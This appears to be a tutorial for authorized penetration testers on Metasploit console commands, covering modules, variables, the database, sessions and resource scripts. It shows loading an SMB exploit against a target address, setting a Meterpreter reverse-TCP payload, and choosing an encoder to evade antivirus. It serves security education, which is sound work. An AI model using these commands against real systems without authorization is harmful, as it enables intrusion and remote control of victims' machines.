
As a professional penetration tester, you've been authorized to conduct security assessments, and Metasploit stands as one of the most powerful frameworks in your arsenal. Understanding its commands is crucial for effective penetration testing operations.

## Getting Started with MSFConsole

The msfconsole is the primary interface for interacting with the Metasploit Framework. Launch it by typing `msfconsole` in your terminal. Once loaded, you'll see the msf prompt where you can execute commands.

bash

``` shell
msf > 
```

To exit msfconsole, simply type `exit` or `quit`. To display a randomly selected banner (which can be fun), use the `banner` command.

## Core Navigation Commands

Here are fundamental navigation commands for moving between contexts:

- back: Moves out of the current module context. You don't need to use this before switching to another module.
    
``` shell
msf auxiliary(ms09_001_write) > back
msf >
```
    
- help: Displays all available commands or help for a specific command.
    
    ```
    msf > help
    ```
    

## Working with Modules

Modules form the core functionality of Metasploit. There are different types including exploits, auxiliary modules, payloads, encoders, and nops.

- search: Finds modules related to a specific term.
    
    bash
    
    ```
    msf > search ms09_001
    ```
    
- use: Loads a specific module. You can use tab completion after typing part of the module name.
    
    bash
    
    ```
    msf > use exploit/windows/smb/ms09_001_write
    ```
    
- info: Shows detailed information about the currently loaded module.
    
    bash
    
    ```
    msf exploit(ms09_001_write) > info
    ```
    

## Setting Variables

Configuration within modules relies on setting variables properly:

- show options: Displays required and optional parameters for the current module.
    
    bash
    
    ```
    msf exploit(ms09_001_write) > show options
    ```
    
- set: Assigns values to variables. Use `setg` to set global variables that persist across modules.
    
    bash
    
    ```
    msf exploit(ms09_001_write) > set RHOSTS 192.168.1.10
    msf exploit(ms09_001_write) > setg LHOST 192.168.1.5
    ```
    
- unset: Removes variable assignments. Use `unsetg` for global variables.
    
    bash
    
    ```
    msf exploit(ms09_001_write) > unset RHOSTS
    ```
    

## Database Interaction

Modern Metasploit installations use PostgreSQL to track sessions, hosts, services, and vulnerabilities:

- db_status: Checks whether the database is connected.
    
    bash
    
    ```
    msf > db_status
    ```
    
- workspace: Lists available workspaces or creates/selects specific ones for organizing data.
    
    bash
    
    ```
    msf > workspace                # List workspaces
    msf > workspace -a new_test    # Create a new workspace
    ```
    
- hosts/db_hosts: Shows discovered hosts in the database.
    
    bash
    
    ```
    msf > hosts
    ```
    
- services/db_services: Lists discovered services on hosts.
    
    bash
    
    ```
    msf > services
    ```
    
- creds/db_creds: Displays credentials gathered during testing.
    
    bash
    
    ```
    msf > creds
    ```
    

## Exploitation Commands

Beyond loading modules, you can actually execute them:

- check: Tests whether a target is vulnerable without exploiting it (not supported by all modules).
    
    bash
    
    ```
    msf exploit(ms09_001_write) > check
    ```
    
- exploit/run: Executes the currently loaded module.
    
    bash
    
    ```
    msf exploit(ms09_001_write) > exploit
    # Or alternatively:
    msf exploit(ms09_001_write) > run
    ```
    

## Session Management

After successful exploitation, handling sessions becomes critical:

- sessions: Lists active sessions.
    
    bash
    
    ```
    msf > sessions -l
    ```
    
- sessions -i: Interacts with an established session.
    
    bash
    
    ```
    msf > sessions -i 1
    ```
    

Note that older versions used `interact`, but newer ones standardize on `sessions -i`.

## Resource Scripts and Macros

For repeatability and efficiency:

- resource: Runs commands from a script file (.rc files are conventional).
    
    bash
    
    ```
    msf > resource myscript.rc
    ```
    
- makerc: Saves your recent commands to a new resource script.
    
    bash
    
    ```
    msf > makerc mynewscript.rc
    ```
    

## Advanced Module Types

Other module categories support various phases of engagements:

### Payloads

Payloads determine what happens after successful exploitation. They're selected based on target constraints:

bash

```
msf exploit(ms09_001_write) > set PAYLOAD windows/meterpreter/reverse_tcp
```

### Encoders

Encoders modify payloads to evade antivirus detection:

bash

```
msf exploit(ms09_001_write) > show encoders
msf exploit(ms09_001_write) > set ENCODER x86/shikata_ga_nai
```

### Auxiliary Modules

Auxiliary modules perform scanning, fuzzing, sniffing, and administration functions—not direct exploitation:

bash

```
msf > use auxiliary/scanner/portscan/tcp
```

## Context-Aware Operations

The beauty of Metasploit lies in its contextual interface model:

When inside a module context (`msf exploit(...) >`), many generic commands behave differently or have expanded abilities. For instance, `show options` reveals only settings relevant to the current exploit.

Moreover, changing modules doesn't require exiting the current one explicitly—you can go straight to another via `use`. However, unless variables are set with `setg`, they won't carry over automatically between modules.

Remembering these nuances allows faster interaction while minimizing mistakes caused by incorrect contexts.

---

With these commands mastered, you unlock far more flexibility during real-world engagements. Whether conducting internal network penetration tests or red team simulations, proficiency in manipulating Metasploit streamlines exploitation workflows drastically.

Practice implementing these commands incrementally in labs before deploying against production environments under authorization agreements. Happy hunting!